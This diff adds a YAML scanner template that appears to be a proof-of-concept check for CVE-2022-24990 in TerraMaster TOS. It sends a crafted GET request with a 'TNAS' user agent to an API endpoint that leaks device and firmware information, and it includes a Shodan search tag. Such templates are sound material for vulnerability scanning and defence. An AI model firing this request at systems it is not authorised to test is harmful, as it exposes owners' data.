@@ -1,0 +1,18 @@
+id: poc-yaml-terramaster-tos-information-disclosure
+info:
+  name: TerraMaster TOS 信息泄露漏洞(CVE-2022-24990)
+  severity: high
+  tags:
+  - CVE-2022-24990
+  - 两高一弱
+  finger: tos
+  shodan: TerraMaster
+requests:
+- method: GET
+  path: /module/api.php?mobile/webNasIPS
+  headers:
+    User-Agent: TNAS
+  expression: status_code == 200 && contains(body,"webNasIPS successful") && contains(body,"firmware")
+    && contains(headers,"application/json") && contains(headers,"TerraMaster")
+variables: {}
+transport: http
